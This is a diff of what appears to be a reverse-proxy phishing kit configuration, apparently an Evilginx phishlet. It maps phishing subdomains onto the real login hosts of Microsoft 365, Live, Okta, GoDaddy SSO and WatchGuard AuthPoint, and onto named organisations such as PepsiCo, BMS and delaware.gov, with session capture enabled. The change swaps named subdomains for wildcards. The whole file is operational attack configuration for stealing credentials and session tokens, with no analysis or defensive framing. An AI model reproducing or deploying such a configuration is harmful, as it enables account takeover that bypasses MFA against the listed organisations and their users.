@@ -11,48 +11,48 @@ min_ver: "3.0.0"
 
 #╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦(PROXY_HOSTS)╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦#
 proxy_hosts:
-  - { phish_sub: "blue", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true, auto_filter: true, wildcard: true}
   - { phish_sub: '', orig_sub: '', domain: 'office.com', session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "green", orig_sub: "m365", domain: "cloud.microsoft", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "red", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "yellow", orig_sub: "outlook", domain: "office.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "orange", orig_sub: "outlook", domain: "office365.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "m365", domain: "cloud.microsoft", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "outlook", domain: "office.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "outlook", domain: "office365.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
 ##-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------##
-  - { phish_sub: "purple", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "pink", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "brown", orig_sub: "outlook", domain: "live.com", session: true, is_landing: true, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "outlook", domain: "live.com", session: true, is_landing: true, auto_filter: true, wildcard: true}
 ##-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------##
-  - { phish_sub: "white", orig_sub: "", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "black", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "grey", orig_sub: "o", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "silver", orig_sub: "sci", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "gold", orig_sub: "ulgroup", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "copper", orig_sub: "dotfoods", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "o", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "sci", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "ulgroup", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "dotfoods", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
 ##-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------##
-  - { phish_sub: "wood", orig_sub: "login", domain: "bx.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "stone", orig_sub: "msfed", domain: "bms.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "glass", orig_sub: "advath", domain: "bms.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "metal", orig_sub: "smusxath", domain: "bms.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "paper", orig_sub: "sp.authpoint.usa", domain: "cloud.watchguard.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "fabric", orig_sub: "usa", domain: "authpoint.watchguard.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "plastic", orig_sub: "auth", domain: "op2online.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "rubber", orig_sub: "id", domain: "delaware.gov", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "cotton", orig_sub: "secure", domain: "pepsico.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "login", domain: "bx.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "msfed", domain: "bms.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "advath", domain: "bms.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "smusxath", domain: "bms.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "sp.authpoint.usa", domain: "cloud.watchguard.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "usa", domain: "authpoint.watchguard.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "auth", domain: "op2online.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "id", domain: "delaware.gov", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "secure", domain: "pepsico.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
 ##-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------##
-  - { phish_sub: "silk", orig_sub: "privacynotice.account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "wool", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "leather", orig_sub: "account", domain: "microsoftonline.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "privacynotice.account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "account", domain: "microsoftonline.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
 ##-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------##
   - { phish_sub: '', orig_sub: '', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true, wildcard: true}
   - { phish_sub: "sso", orig_sub: "sso", domain: "godaddy.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
   - { phish_sub: "sso", orig_sub: "sso", domain: "secureserver.net", session: true, is_landing: false, auto_filter: true, wildcard: true}
 ##-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------##
-  - { phish_sub: 'marble', orig_sub: 'gui', domain: 'godaddy.com', session: true, is_landing:false, auto_filter: true, wildcard: true}
-  - { phish_sub: 'granite', orig_sub: 'csp', domain: 'godaddy.com', session: true, is_landing:false, auto_filter: true, wildcard: true}
-  - { phish_sub: 'crystal', orig_sub: 'reporting', domain: 'cdndx.io', session: false, is_landing:false, auto_filter: true, wildcard: true}
-  - { phish_sub: "diamond", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: '*', orig_sub: 'gui', domain: 'godaddy.com', session: true, is_landing:false, auto_filter: true, wildcard: true}
+  - { phish_sub: '*', orig_sub: 'csp', domain: 'godaddy.com', session: true, is_landing:false, auto_filter: true, wildcard: true}
+  - { phish_sub: '*', orig_sub: 'reporting', domain: 'cdndex.io', session: false, is_landing:false, auto_filter: true, wildcard: true}
+  - { phish_sub: "*", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
 ##-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------##
-  - {phish_sub: 'pearl', orig_sub: 'portal', domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - {phish_sub: '*', orig_sub: 'portal', domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: true, wildcard: true}
 
 #╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦(ＳＵＢ_ＦＩＬＴＥＲＳ)╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦#
 sub_filters:
